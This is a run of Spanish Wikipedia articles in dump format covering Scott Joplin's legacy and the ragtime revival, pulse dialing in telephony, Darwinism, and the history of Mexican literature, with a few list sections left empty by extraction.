Como Joplin nunca hizo una grabación de sonido, su música es preservada solo en siete rollos de piano para uso en pianolas. Los siete fueron hechos en 1916. De éstos, los seis lanzados bajo el sello Connorized muestran evidencias de edición significativa, probablemente por William Axtmann, el arreglador del staff de Connorizad. Berlín teoriza que al momento en que Joplin llegó a St. Louis, él pudo haber experimentado descoordinación de los dedos, temblores y una dificultad para hablar, claramente todos síntomas de la sífilis que cobró su vida en 1917. El biógrafo Blesh describió la segunda grabación de rollo de "Maple Leaf Rag" para el sello UniRecord de junio de 1916 como "...chocante... desorganizada y completamente dolorosa de oír." Mientras hay desacuerdo entre los expertos en rollos para pianola respecto de la precisión en la reproducción de lo que ejecuta el músico, Berlin nota que el rollo del Maple Leaf Rag era, "dolorosamente malo," y que probablemente sería el más fiel registro de como Joplin tocaba en esa época. El rollo, pues, no refleja las habilidades que pudo tener más temprano en su vida.

Joplin y sus compañeros compositores de ragtime rejuvenecieron la música popular estadounidense, estimulando la apreciación de la música Afroamericana entre los americanos de origen europeo, creando melodías de baile estimulantes y liberadoras, cambiando el gusto musical americano. "Su síncopa y manejo rítmico, le dieron una vitalidad y frescura atractiva a las jóvenes audiencias urbanas, indiferentes al decoro Victoriano... el ragtime de Joplin expresaba la intensidad y energía de un moderno Estados Unidos urbano."

Joshua Rifkin, un artista destacado por sus grabaciones de Joplin, escribió: "Una penetrante sensación generalizada de lirismo infunde su trabajo, y aún en su más alto espíritu, no puede reprimir un toque de melancolía o adversidad ... él tenía muy poco en común con la rápida y llamativa escuela de ragtime que creció después de él". El historiador de Joplin Bill Ryerson agrega que "en las manos de un auténtico profesional como Joplin, el ragtime fue una forma disciplinada capaz de asombrosa variedad y sutileza... Joplin hizo por el rag lo que Chopin hizo por la mazurka. Su estilo abarcaba desde tonos de tormento a maravillosas serenatas que incorporaron el bolero y el tango." La biógrafa Susan Curtis escribió que la música de Joplin había ayudado a "revolucionar la música y la cultura americana" eliminando la compostura Victoriana.

Al compositor y actor Max Morath le resultó llamativo que la inmensa mayoría de la obra de Joplin no disfrutó de la popularidad del Maple Leaf Rag, porque mientras las composiciones eran de creciente belleza lírica y delicadez de síncopa quedaron a la sombra sin ser oídas durante su vida. Joplin aparentemente se dio cuenta de que su música estaba adelantada a su tiempo: como menciona el historiador Ian Whitcomb que Joplin "opinaba que el Maple Leaf Rag lo haría el 'Rey de los Compositores de Ragtime' pero que también sabía que no sería un héroe de la música popular en su propia vida. "Cuando lleve veinticinco años muerto, la gente me va a reconocer,' le dijo a un amigo." Justo treinta años después fue reconocido, y luego el historiador Rudi Blesh escribió un gran libro acerca del ragtime, el cual dedicó a la memoria de Joplin.

Aunque no tenía un centavo y decepcionado al final de su vida, Joplin estableció el estándar para las composiciones del ragtime y desempeñó un papel clave en el desarrollo del rag. Y como compositor e intérprete pionero, ayudó a abrir el camino para los jóvenes artistas negros para llegar a las audiencias americanas de ambas razas. Después de su muerte, el historiador de jazz Floyd Levin observó: "Esos pocos que se dieron cuenta de su grandeza inclinaron sus cabezas con dolor. Este fue el fallecimiento del rey de todos los escritores de ragtime, el hombre que dio a América una auténtica música nativa.

Después de su muerte en 1917, la música y el ragtime de Joplin en general disminuyeron en popularidad a medida que surgieron nuevas formas de estilos musicales, como el jazz y el piano novedad. Aun así, las bandas de jazz y artistas como Tommy Dorsey en 1936, Jelly Roll Morton en 1939 y J. Russell Robinson en 1947 relanzaron grabaciones de composiciones de Joplin. Maple Leaf Rag fue la pieza de Joplin que se encuentra con mayor frecuencia en discos de 78 rpm.

En la década de 1960, un despertar a pequeña escala del interés por el ragtime clásico estaba en marcha entre algunos estudiosos de la música estadounidense como Trebor Tichenor, William Bolcom, William Albright y Rudi Blesh. Audiophile Records lanzó un conjunto de dos discos, "The Complete Piano Works of Scott Joplin, The Greatest of Ragtime Composers", interpretados por Knocky Parker, en 1970.

En 1968, Bolcom y Albright le hicieron interesarse a Joshua Rifkin, un joven musicólogo, en el cuerpo del trabajo de Joplin. Juntos presentaron una ocasional noche de ragtime y jazz temprano en la radio WBAI. En noviembre de 1970, Rifkin lanzó una grabación llamada "Scott Joplin: Piano Rags" bajo el clásico sello Nonesuch, se vendieron 100.000 copias en su primer año y eventualmente se convirtió en el primer millón de ventas de discos de Nonesuch. La lista de la cartelera de los "LP clásicos más vendidos" del 28 de septiembre de 1974 lo tiene registrado en el número 5, con el que le sigue, "Volumen 2", en el número 4, y el combinado de los dos volúmenes en el número 3. Separadamente, ambos volúmenes han estado en la lista durante 64 semanas. Al tope de los mejores siete de esa lista, seis de los registros eran grabaciones de las obras de Joplin, tres de las cuales eran de Rifkin. Las discográficas se vieron por primera vez poniendo rag en la sección de música clásica. El álbum fue nominado en 1971 en dos categorías de los premios Grammy: Mejores Notas de Álbum y Mejor Performance de Solista Instrumental (sin orquesta). A Rifkin también se lo consideró para un tercer Grammy por una grabación no relacionada con Joplin, pero en la ceremonia del 14 de marzo de 1972 Rifkin no logró ganar en ninguna categoría. Hizo una gira en 1974, la cual incluyó apariciones en la BBC TV y terminó el concierto en el London´s Royal Festival Hall. En 1979 Alan Rich escribió en la revista "New York Magazine" que por darle a artistas como Rifkin la oportunidad de poner la música de Joplin en un disco Nonesuch Records "...creó casi solo, el renacimiento de Scott Joplin.

En enero de 1971, Harold C. Schonberg, el crítico musical del New York Times, habiendo recién escuchado el álbum de Rifkin, escribió un artículo destacado de la edición del domingo titulado: "¡Estudiantes, ocúpense de Scott Joplin!" El llamado a la acción de Schonberg ha sido descrito como el catalizador para los estudiosos de música clásica, el tipo de gente con la que Joplin había batallado toda su vida, para llegar a la conclusión de que Joplin fue un genio. Vera Brodsky Lawrence de la biblioteca pública de Nueva York, publicó en dos volúmenes conjuntos el trabajo de Joplin en junio de 1971, titulado "The Collected Works of Scott Joplin", estimulando un interés más amplio en la interpretación musical de Joplin.

A mediados de febrero de 1973 bajo la dirección de Gunther Schuller, The New England Conservatory Ragtime Ensemble grabó un álbum de los rags de Joplin, tomados del período de "Standard High-Class Rags" llamado "". El álbum ganó un premio Grammy como Mejor Interpretación de Música de Cámara de ese año, y siguió hasta convertirse en el Mejor Álbum de Clásica de 1974 según la revista "Billboard". El grupo posteriormente grabó dos álbumes más para Golden Crest Records: "More Scott Joplin Rags" en 1974 y "The Road From Rags To Jazz" en 1975.

En 1973, el productor cinematográfico George Roy Hill contactó con Schuller y Rifkin separadamente, pidiéndole a cada uno escribir la partitura para un proyecto de película sobre la que estaba trabajando: "El golpe (película de 1973)". Ambos personajes rechazaron la solicitud por compromisos previos. En cambio Hill encontró a Marvin Hamlisch disponible y lo trajo al proyecto como compositor. Hamlisch adaptó ligeramente la música de Joplin para El Golpe, por la cual ganó un premio Óscar a la mejor banda sonora y mejor adaptación musical el 2 de abril de 1974. Su versión de "The Entertainer" alcanzó el número 3 en el Billboard Hot 100 y la American Top 40 de música el 18 de mayo de 1974, provocando que el "The New York Times" escriba: "La nación entera ha comenzado a comprender". Gracias a la película y su partitura, el trabajo de Joplin comenzó a apreciarse tanto en el mundo de la música popular como el de la clásica mundial, favoreciendo (en las palabras de la revista musical Record Word), el "fenómeno clásico de la década". Rifkin luego dijo de la banda sonora de la película, que Hamlish tomó sus adaptaciones de piano directamente del estilo de Rifkin y sus adaptaciones de banda del estilo de Schuller. Schuller dijo de Hamlisch,"... consiguió el Óscar por la música que él no escribió (porque es de Joplin) y los arreglos que no escribió y las 'ediciones' que no hizo. Mucha gente se ofendió por eso, pero ¡así es el negocio del "espectáculo"!.

El 22 de octubre de 1971, se presentaron extractos de "Treemonisha" en forma de concierto en el Lincoln Center con actuaciones musicales de Bolcom, Rifkin y Mary Lou Williams, apoyando a un grupo de cantantes. Por último, el 28 de enero de 1972, la orquestación de Treemonisha de T. J. Anderson fue puesta en escena en una producción de ópera completa por dos noches consecutivas, auspiciada por el Taller de Música Afroamericana del Morehouse College en Atlanta, con cantantes acompañados por la Orquesta Sinfónica de Atlanta bajo la dirección de Robert Shaw, y coreografía de Katherine Dunham. Schonberg observó en febrero de 1972 que el "Renacimiento de Scott Joplin" contaba con pleno envión y aún creciendo. En mayo de 1975, "Treemonisha" fue puesta en escena en una producción de ópera completa por la Houston Grand Opera. La compañía hizo una gira rápida y luego se quedó ocho semanas seguidas en Broadway, Nueva York, en el Palace Theater entre octubre y noviembre. Estas apariciones fueron dirigidas por Gunther Schuller y la soprano Carmen Balthrop alternó con Kathleen Battle como el personaje del título. Se produjo una grabación del "reparto original de Broadway". Debido a la falta de exposición nacional dada a la breve puesta en escena del Morehouse College en 1972, muchos estudiosos de Joplin escribieron que la función de la Houston Grand Opera de 1975 fue la primera gran producción de la obra.

1974 vio al Royal Ballet, bajo la dirección de Kenneth MacMillan, crear la Elite Syncopations, un ballet basado en canciones de Joplin y otros compositores de la época. Ese año también trajo el estreno del Ballet de Los Ángeles de "Red Back Book", coreografiada por John Clifford para rags Joplin de la colección del mismo nombre, que incluye tanto actuaciones de piano solista como actuaciones y arreglos para orquesta completa.

1970: Joplin ha sido incluido dentro de los compositores del Salón de la Fama de la Academia Nacional de la Música Popular.

1976: a Joplin se le dio un Premio Pulitzer Especial..." otorgado póstumamente en el Año del Bicentenario de la nación, por su contribución en la Música Americana.

1977: Producciones Motown, produjo Scott Joplin, una biografía fílmica con el actor Billy Dee Williams como Joplin, lanzado por Universal Pictures.

1983: El Servicio Postal de los Estados Unidos emitió un sello conmemorativo del compositor como parte de su herencia negra.

1989: Joplin recibió una estrella en el Corredor de la Fama de San Luis.

2002: una colección de las propias actuaciones de Joplin registradas en los rollos de pianola en la década de 1900 fue incluida por la Junta Nacional de Preservación de Grabaciones en el Registro de Grabaciones de la Biblioteca del Congreso Nacional. La Junta anualmente selecciona canciones que son "... cultural, histórica o estéticamente significativas".




</doc>
<doc id="6507" url="https://es.wikipedia.org/wiki?curid=6507" title="Marcación decádica por pulsos">
Marcación decádica por pulsos

La marcación decádica por pulsos es una tecnología de señalización en telecomunicaciones en la cual un circuito de bucle local es interrumpido de acuerdo a una codificación definida, usualmente un dígito. Cada uno de los diez dígitos es codificado en secuencias de hasta diez pulsos y de ahí su nombre. Históricamente, el dispositivo más común para producir estos pulsos es el disco de marcar del teléfono. Otro término, el de discado por desconexión de bucle, surge del método que se emplea que es el de la interrupción del circuito local.

La velocidad de generación de los pulsos, fue históricamente determinada basándose en el tiempo de respuesta necesario para que los sistemas de conmutación electromecánica operaran confiablemente. La mayoría de los sistemas telefónicos usó una velocidad de 10 pulsos/segundo, pero el discado por operador dentro y entre las centrales telefónicas a veces usaban velocidades de 20 pulsos/segundo.

Los sistemas de centrales telefónicas automáticas fueron desarrollados al final del siglo 19 e inicios del siglo 20. Para ser identificados, a los suscriptores del servicio les fue asignado un número telefónico único por cada circuito. La primera central telefónica automática diseñada por el empresario estadounidense y su sobrino Walter S. Strowger fue abierta en La Porte (Indiana), Estados Unidos el 3 de noviembre de 1892, con equipos fabricados por la compañía "Strowger Automatic Telephone Exchange" y utilizó aparatos telefónicos que tenían tres manipuladores telegráficos, que debían ser pulsados en un número adecuado de veces para controlar indicar al equipo de la central el número del receptor y un cuarto manipulador era usado, si el usuario se equivocaba al marcar.Sin embargo, el uso de ese sistema resultaba impráctico. El sistema más común de señalización fue el de la interrupción del bucle local mediante un tren de pulsos de corriente directa generado en los teléfonos de los suscriptores...

En vista de lo inconveniente del sistema de pulsadores, el 11 de enero de 1898, a tres de los socios de la compañía de Almon Strowger, Alexander Keith, John y Charles Erickson se les concedió la patente 597.062 de "un dispositivo de llamada para centrales telefónicas" en el cual se incluía un disco rotatorio para el marcado del teléfono de destino, pero este disco no tenía huecos sino bordes similares a los de una rueda dentada. Los pulsos eran enviados cuando el usuario giraba el disco hasta una posición de tope diferente para cada dígito transmitido. La operación libre de errores del disco requería de un movimiento de rotación suave por parte del usuario, pero este sistema se consideró poco fiable. Este mecanismo fue pronto refinado para incluir un resorte recuperador y un regulador centrífugo para controlar la velocidad de retroceso, innovación que ya aparecía en 1905. El usuario seleccionaba un número mediante la inserción de un dedo en el orificio del disco giratorio correspondiente hasta un tope. Cuando se liberaba de esta posición, los contactos de marcación se abrían y cerraban varias veces, interrumpiendo así la corriente de bucle. La central telefónica decodificaba el patrón de cada dígito transmitido de este modo de transmisión mediante relés de paso o por acumulación en los llamados registradores de dígitos. Inicialmente, los discos de marcar se fabricaban de metal, hasta que el 3 de junio de 1941 la Oficina de Patentes de Estados Unidos concedió al estadounidense Frank A. Cosgrove, empleado de AT&T, la patente 2.244.609 por inventar un disco de plástico, que se convirtió en estándar en lo sucesivo. 

Cuando el sistema de conmutación electromecánica aún estaba en uso, los pulsos de corriente generados por el disco giratorio activaban relés en los interruptores o conmutadores de la central telefónica. La naturaleza mecánica de estos relés y la capacitancia del bucle, afectaban la forma del pulso, limitando por lo general la velocidad de la operación a diez pulsos por segundo.

Las especificaciones de Bell Systems en los EE.UU. requerían que el personal de servicio ajustara los discos de marcar en las equipos de los clientes con una precisión de 9,5 a 10,5 impulsos por segundo, pero la tolerancia de los equipos de conmutación era generalmente de entre 8 y 11 puntos porcentuales.

En algunos teléfonos, los pulsos se pueden escuchar en el receptor como chasquidos. Cada dígito está representado por un número diferente de pulsos. En la mayoría de los países, un pulso identifica al dígito 1, dos pulsos de 2, y así sucesivamente, con diez pulsos para el dígito 0; lo que hace que el código sea unario, excepto para el dígito 0. Excepciones a esto, ocurrieron en Suecia, con un solo pulso para 0, dos pulsos para 1, y así sucesivamente; y en Nueva Zelanda, con diez pulsos para 0, nueve pulsos para 1, etc. En Oslo, la capital de Noruega, se usó el sistema de marcación del sistema de Nueva Zelanda, pero el resto del país no lo hizo. Los sistemas que utilizan esta codificación de los 10 dígitos en una secuencia de hasta 10 pulsos, se conocen a veces como sistemas de marcación decádicos.

Más tarde, algunos sistemas de conmutación utilizaron registros de dígitos que duplicaron la tasa de pulsos permisible a 20 pulsos por segundo, y que reducían la pausa entre dígitos ya que la selección del interruptor no tenía que ser completada durante la pausa. Algunos de estos sistemas incluyeron centrales de barras cruzadas, la versión 7A2 del sistema de conmutación Rotary, y las primeras centrales telefónicas de la década de 1970 de control por programa almacenado.

En 1963, Bell System introdujo la tecnología de marcación por tonos conocida también como DTMF ("Dual-Tone Multifrequency", en idioma inglés) bajo la marca registrada "Touch-Tone" utilizando teléfonos con teclado. En las décadas siguientes, la marcación por pulsos se ha ido suprimiendo gradualmente como método de señalización primaria a la central telefónica, pero muchos sistemas siguen apoyando teléfonos de disco para ofrecer compatibilidad. Algunos modelos de teléfonos de teclado tienen un interruptor para seleccionar la marcación por tonos o pulsos.

En los sistemas de voz sobre Protocolo de Internet (VoIP), la marcación de dígitos se puede sustituir por completo al iniciar una llamada telefónica mediante la especificación del identificador de recursos uniforme del receptor.


</doc>
<doc id="6509" url="https://es.wikipedia.org/wiki?curid=6509" title="Darwinismo">
Darwinismo

El darwinismo es un término con el que se describen las ideas de Charles Darwin, especialmente en relación a la evolución biológica por selección natural.

El darwinismo no es sinónimo de evolucionismo, dado que este último es anterior a Charles Darwin: las teorías darwinistas son evolucionistas, pero su aportación clave es el concepto de selección natural considerado determinante para explicar la causa de la evolución y que en su posterior desarrollo, con numerosas aportaciones y correcciones, permitirá la formulación de la teoría de la evolución actual o síntesis evolutiva moderna. Por tanto es igualmente equivocado usar el término «darwinismo» para referir la actual teoría de la evolución, ya que esta no se reduce sólo a las ideas postuladas por Charles Darwin.

Para el biólogo evolutivo Ernst Mayr el término «darwinismo» tiene al largo de la historia y desde 1859 (año de publicación de la obra de Darwin "El origen de las especies") al menos nueve usos diferentes. Al principio el darwinismo solo significaba anticreacionismo.
Si alguien explicaba el cambio evolutivo acudiendo a causas naturales y no divinas era tachado de «darwinista» (por ejemplo, Thomas Henry Huxley y Charles Lyell).

El uso del término variará conforme las diversas teorías y subteorías que contenían los postulados los cuales fueron poco a poco siendo aceptados, para después ser matizados, corregidos y completados hasta la formulación, en la década de 1940 a 1950, de la síntesis evolutiva moderna. Desde entonces puede decirse que el paradigma darwinista resiste frente a los ataques sufridos y el reduccionismo, su formulación básica está vigente y parece que puede durar: la evolución es el resultado de la variación genética y de su ordenamiento mediante la eliminación y la selección.

Las concepciones evolucionistas de Darwin constituyen un complejo sistema teórico, un conjunto de teorías relacionadas, más que una teoría singular. El núcleo de esas concepciones sigue conservando toda su validez, a pesar de su natural insuficiencia y de algún error significativo, sobre todo en su explicación de la herencia a través de pangénesis. En el darwinismo hay tres ejes teóricos que explican distintos aspectos de la realidad biológica.


La teoría propuesta por Darwin de la evolución de las especies por medio de la selección natural de las variaciones genéticas lleva implícita una visión de los seres vivos que se puede clasificar como materialista.
El ser humano no ocupa ningún lugar privilegiado dentro del mundo vivo. Las causas finales no encuentran acomodo en el mecanicismo darwiniano. No hay lugar en la teoría evolutiva para la emergencia de una «mente» en el sentido dualista, pues la generación y evolución de los sistemas nerviosos son procesos estrictamente biológicos y, por ende, físicos.

Las formulaciones que Darwin hace de sus teorías fueron influidas en un alto grado por un lenguaje aprendido de sociólogos o publicistas (politólogos), como Thomas Malthus y Herbert Spencer. Como el propio Alfred Russel Wallace reconoció, la lectura de Malthus fue decisiva para la formulación de la teoría de la selección natural. Las ideas malthusianas se conocían y discutían en los ambientes intelectuales de la época. Conceptos como competencia, lucha por la vida y sobrepoblación, que aparecen en "Ensayo sobre el principio de la población" de Thomas Malthus, sirvieron tanto a Alfred Russel Wallace como a Darwin para dar forma a sus teorías.

En pleno auge de la teoría de la selección natural propuesta por Charles Darwin, y tras las controversias iniciales, el concepto de la selección natural y las relaciones interespecíficas fueron trasladadas a las relaciones sociales; sin embargo, no existe un método claro de aplicar el uno a las otras y, así, bajo el término peyorativo de "darwinismo social" se han calificado ideologías, muchas veces contrapuestas que, lo mismo podían defender el "laissez faire" que el socialismo de estado, el imperialismo o la eugenesia a escala local. Muchas de estas tendencias tienen poco que ver con las ideas de Darwin quien, ciertamente, defendió la eugenesia voluntaria en su libro "La herencia del hombre y la selección en relación con el sexo"; pero no por imposición.






</doc>
<doc id="6516" url="https://es.wikipedia.org/wiki?curid=6516" title="Literatura de México">
Literatura de México

La literatura de México es una de las más prolíficas de la lengua española. Tiene autores reconocidos a nivel internacional tales como Elena Poniatowska, Juan Rulfo, Juan José Arreola, Elena Garro, Octavio Paz, Rosario Castellanos, Carlos Fuentes, Amado Nervo, Jaime Sabines, Federico Gamboa, José Emilio Pacheco, Alfonso Reyes, Fernando del Paso y muchos más.

Tiene sus antecedentes en las literaturas de los pueblos indígenas de Mesoamérica. Sin embargo, con la llegada de los españoles, se dio un proceso de mestizaje que luego dio paso a una época de criollización de la literatura producida en la Nueva España. El mestizaje de la literatura novohispana es evidente en la incorporación de numerosos términos de uso corriente en el habla local del virreinato y en algunos de los temas que se tocaron en las obras del periodo. Durante la época virreinal, Nueva España albergó a escritores barrocos como Bernardo de Balbuena, Carlos de Sigüenza y Góngora, Juan Ruiz de Alarcón, Francisco de Castro, Luis Sandoval Zapata, Sor Juana Inés de la Cruz, llamada "La Décima Musa". Muy destacados todos, y que dieron la lucha inicial por la emancipación de la literatura nacional de la literatura de la península: Diego José Abad, Francisco Javier Alegre y Fray servando Teresa de Mier.

Hacia el final del régimen colonial, en Nueva España surgieron figuras como José Joaquín Fernández de Lizardi, cuya obra es considerada como emblema de la picaresca mexicana y la primera novela moderna escrita en el continente americano. Hacia la segunda mitad de ese siglo, surgen obras como "Los mexicanos pintados por sí mismos", libro costumbrista que nos da una idea aproximada de cómo veían los intelectuales de la época al resto de sus coterráneos. Hacia el final del siglo, durante el Porfiriato, los escritores mexicanos se inclinan hacia las tendencias dominantes de la época. Para celebrar el centenario de la Independencia de México, se preparó la llamada "Antología del Centenario", que pretendía recopilar autores de los primeros cien años de México, pero quedó trunca y se publicó sólo el primer tomo en dos volúmenes que, sin embargo, recogen la poesía. Los grandes poetas de la época son Fray Manuel de Navarrete, Fernando Calderón, Ignacio Rodríguez Galván. Destacan la pléyade de poetas modernistas como Amado Nervo y Manuel Gutiérrez Nájera. De la misma época y que recopiló la "Antología del Centenario", Luis G. Urbina. De reconocido prestigio, Efrén Rebolledo, José Juan Tablada, Enrique González Martínez y Ramón López Velarde.

La irrupción de la Revolución mexicana favorece el desarrollo del género periodístico. Una vez concluido el conflicto civil, el tema de la Revolución apareció como tema en novelas, cuentos y obras teatrales en las plumas de Mariano Azuela o Rodolfo Usigli. Esta tendencia sería antecedente del florecimiento de una literatura nacionalista, que tomó cuerpo en la obra de escritores como Rosario Castellanos o Juan Rulfo. También aparece en escena una literatura de corte indigenista, que pretende retratar el pensamiento y la vida de los pueblos indígenas de México, aunque irónicamente, ninguno de los autores fuera indígena. Entre ellos hay que señalar a Miguel Ángel Menéndez Reyes, a Ricardo Pozas y a Francisco Rojas González.

De modo alterno a estas corrientes dominantes, se desarrollaron en el país otros movimientos menos conocidos por estar fuera del foco principal. Entre ellos hay que señalar a los "estridentistas" (década de 1920), como Arqueles Vela y Manuel Maples Arce. Otro movimiento de relevancia para la historia literaria del país lo constituyó el grupo de "Los Contemporáneos" (década de 1930), que agrupaba a figuras como el periodista Salvador Novo y los poetas Xavier Villaurrutia y José Gorostiza. Ya hacia la segunda mitad del siglo XX, la literatura mexicana se había diversificado en temáticas, estilos y géneros. Surgen nuevos grupos, como "La onda" (década de 1960), que apostaba por una literatura urbana, satírica y contestataria; entre los autores destacados están Parménides García Saldaña y José Agustín; "Los infrarrealistas" (década de 1970), que pretendía "volarle la tapa de los sesos a la cultura oficial"; "La mafia" (década de 1960), conformada por Carlos Fuentes, Salvador Elizondo, José Emilio Pacheco, Carlos Monsiváis, Inés Arredondo, Fernando Benítez y otros. En 1990, Octavio Paz se convirtió en el único mexicano hasta la fecha que ha ganado el Premio Nobel de Literatura.

A pesar de que los pueblos de Mesoamérica desarrollaron sistemas de escritura, estos no fueron empleados para conservar la literatura de esos pueblos. La mayor parte de los mitos y obras literarias de los pueblos de Mesoamérica se transmitieron por tradición oral. Se sabe, por ejemplo, que entre las actividades que tenían que dominar los novicios de sacerdotes entre los mexicas se encontraba la memorización de obras líricas o de la mitología de su pueblo. Algunas de estas producciones fueron fijadas para siempre por medio del alfabeto latino que los misioneros de Indias emplearon en el siglo XVI para transcribir la información que recibían de los indígenas. Especialistas modernos como Ángel María Garibay K. y Miguel León-Portilla, han traducido estas obras que se encontraban desperdigadas en varios textos y las han reunido o reseñado en obras como "Visión de los vencidos", "Poesía indígena de la Altiplanicie" o "Historia de la literatura náhuatl".

La obra de los misioneros en el centro de México permitió conservar más fielmente la tradición oral de los pueblos de habla náhuatl, en comparación con los habitantes de otras zonas de Mesoamérica. En ese sentido resulta especial el conjunto de obras líricas atribuidas a Acolmiztli Nezahualcóyotl (1402–1472), "tlatoani" de Tetzcuco, que pasó a la posteridad con el título de "Rey Poeta". Sus obras, junto con las de otros nobles de los pueblos nahuatlacas del Eje Neovolcánico como Ayocuan (de Chalco-Atenco) y Tecayehuatzin (de Huexotzinco), constituyen la muestra más amplia de obras líricas y filosóficas precolombinas recuperadas para la posteridad. De menores dimensiones es el acervo literario recuperado entre otros pueblos del Posclásico, como los purépechas, los zapotecos y los mixtecos. El caso de los mixtecos es especial, puesto que se conservan cuatro códices que han permitido hacer una aproximación a la historia de ese pueblo bajo la impronta de Ocho Venado, "yya" (Señor) de Tilantongo y Tututepec. Por otra parte, en el Área Maya, se conservaron fragmentos de los llamados "Libros de Chilam Balam". Bien conocida es, por otra parte, la literatura precolombina de los quichés, pueblo mayance que sin embargo no habitó en el actual territorio mexicano, sino en lo que hoy es Guatemala. En idioma quiché se escribió el "Popol Wuj" o "Libro del Consejo", que incorpora dos mitos cosmogónicos mayas: la creación del mundo y el descenso de Hunahpú e Ixbalanqué a Xibalbá, el inframundo de los mayas.

Por último, fuera de Mesoamérica, Arturo Warman adelanta como hipótesis que las coplas interpretadas por los músicos yaquis y mayos durante la ejecución de la Danza del Venado tengan su origen en la época precolombina, y que hayan llegado hasta nuestros días con pocos cambios desde entonces.

Entre los pueblos prehispánicos floreció:


En la literatura virreinal de México podemos distinguir varios periodos. En el primero la literatura está vinculada con el momento histórico de la conquista, en él abundan las cartas y crónicas.

Obras y escritores:


En este periodo floreció el arte barroco. Muchos de los autores conocidos del siglo incursionaron con mayor o menor éxito en el terreno de los juegos literarios, con obras como anagramas, emblemas y laberintos. Hubo autores notables en la poesía, la lírica, la narrativa y la dramaturgia. Subgéneros: soneto, décima, octava real, romance, epigrama, glosa, centón, quintilla, vaya, redondilla, redondilla de pie quebrado, romance con asonantes forzosos.

Autores:

Surgieron escritores ilustrados y clasicistas como:


Durante el siglo XIX hubo tres grandes corrientes literarias: el romanticismo, el realismo-naturalismo y el modernismo.

Los escritores románticos se agruparon en torno a cientos de asociaciones; entre las más importantes la Academia de Letrán, fundada en 1836 (José María Lacunza, Guillermo Prieto, Manuel Carpio, Andrés Quintana Roo, José Joaquín Pesado, Ignacio Rodríguez Galván, Ignacio Ramírez), y el Liceo Hidalgo, fundado en 1850 (Ignacio Manuel Altamirano, Manuel Acuña, Manuel M. Flores). A quienes se etiquetó como neoclásicos o académicos, en oposición a la categoría de "románticos" que se les daba a los primeros. A este primer grupo también pertenecen José Manuel Martínez de Navarrete, Vicente Riva Palacio, Joaquín Arcadio Pagaza, Justo Sierra y Manuel José Othón.

Más tarde, durante el auge del positivismo el gusto estético cambió. Entre los escritores mexicanos realistas y naturalistas tenemos a Luis G. Inclán, Rafael Delgado, Emilio Rabasa, José Tomás de Cuéllar, Federico Gamboa y Ángel de Campo.

Dentro de la corriente modernista, revolución literaria originaria de América Latina, hubo numerosas innovaciones métricas y de rima, resurgimiento de formas en desuso y, principalmente, hallazgos simbólicos. Entre 1895 y 1910 México se volvió un núcleo de actividad modernista; entre los escritores tenemos a Manuel Gutiérrez Nájera, Enrique González Martínez, Salvador Díaz Mirón y Amado Nervo.




En los años que van de 1900 a 1914 siguió predominando en la poesía el modernismo y en la prosa el realismo y naturalismo. Durante este periodo convivieron los representantes de la literatura decimonónica con los integrantes del Ateneo de la juventud.

De 1915 a 1930 hubo tres corrientes: una renovación estilística que incorporaba influencias de las vanguardias europeas (el estridentismo (Manuel Maples Arce, Germán List Arzubide, Arqueles Vela) y los Contemporáneos), un grupo de escritores retomaba temas coloniales (Xavier Villaurrutia, Jaime Torres Bodet, Jorge Cuesta, José Gorostiza, Salvador Novo), y otros que comenzaron a publicar las llamadas «novelas de la Revolución» (la más conocida es "Los de abajo" de Mariano Azuela): Martín Luis Guzmán, Rafael F. Muñoz, Heriberto Frías, Jorge Ferretis, Nellie Campobello, Francisco L. Urquizo.

Hasta mediados de la década de 1940 hubo autores que continuaron con narrativa realista, pero también conocieron su auge la novela indigenista y las reflexiones en torno al ser y la cultura nacional. Surgieron dos nuevas generaciones poéticas, agrupadas en torno a las revistas "Taller" y "Tierra Nueva".

Con la publicación de "Al filo del agua" de Agustín Yáñez en 1947 comenzó lo que llamamos «novela mexicana contemporánea», que incorporó técnicas entonces novedosas, influencias de escritores estadounidenses (William Faulkner y John Dos Passos), e influencia europea (James Joyce y Franz Kafka), y en 1963, la hasta entonces conocida por sus artículos en periódicos y revistas y su hermoso teatro, Elena Garro, publica la novela "Los recuerdos del porvenir". Si bien durante el periodo que va de 1947 a 1961 predominaron los narradores (Arreola, Rulfo, Fuentes), surgieron entonces poetas de valía como Rubén Bonifaz Nuño y Rosario Castellanos (también narradora).

En 1960 se editó la antología "La espiga amotinada", que agrupó al importante grupo de poetas: Juan Bañuelos, Oscar Oliva, Jaime Augusto Shelley, Eraclio Zepeda y Jaime Labastida. Las revistas literarias fueron uno de los principales vehículos de difusión de los escritores, de manera que se tiende a agrupar a muchos de ellos bajo el nombre de las revistas en las que participaron. "El Hijo pródigo" fue dirigida por Xavier Villaurrutia, del grupo "Los Contemporáneos", quien tuvo como coolaborador a Octavio Paz. Octavio Paz fundó, tras su salida del periódico "Excélsior", la revista "Vuelta", que encabezó durante muchos años la cultura nacional, fundamentalmente tras la muerte de Martín Luis Guzmán en 1976. Tras la muerte de Octavio Paz, un grupo de sus coolaboradores trató de fundar una revista que ocupara su lugar, pero la revista naciente, "Letras libres", no logró tener la aceptación que tuvo "Vuelta".
En 1979, Gabriel Zaid hace un censo de poetas que publica en su antología "Asamblea de poetas jóvenes de México"; entre quienes han destacado de los incluidos, como poetas, Eduardo Hurtado, Alberto Blanco, Coral Bracho, Eduardo Casar, Eduardo Langagne, Manuel Ulacia, Vicente Quirarte, Víctor Manuel Mendiola, Dante Medina, Verónica Volkow, Perla Schwartz, Jaime Moreno Villarreal y Francisco Segovia. Estos y el resto de los incluidos son quienes conforman actualmente el grupo de autores en la cúspide de sus carreras literarias. La mayoría colaboró en "Vuelta".
Tal vez los poetas actuales de mayor envergadura sean Elsa Cross y Efraín Bartolomé, cuyas voces se hacen escuchar con gran fuerza en los grandes medios.






Le llamaron Generación de la Casa del Lago o de la "Revista Mexicana de Literatura", y al igual que el movimiento de "Ruptura", un objetivo primordial de estos escritores fue dejar de lados los sentimientos nacionalistas y la literatura indigenista para lanzarse a una expresión literaria mucho más universal, siendo sus principales modelos diversos artistas mexicanos que de igual forma propusieron una expresión artística más amplia, tales como los integrantes del llamado "Ateneo de la Juventud", los autores contemporáneos y la llamada "Generación Taller".
No hay una fecha precisa o año exacto en el que pueda definirse el comienzo de esta corriente; sin embargo, el año 1956 fue crucial para este grupo de artistas, por ser el año en que Octavio Paz publicó su ensayo "El arco y la lira", donde hacía referencia a las características de la escritura, de la poesía y la novela, de la vocación mística de la literatura, de lo sagrado y el misterio del arte. Esta obra fue de suma importancia para los escritores de la Generación de la Casa del Lago, ya les marcó la pauta acerca de las características que anhelaban transmitir en sus obras.
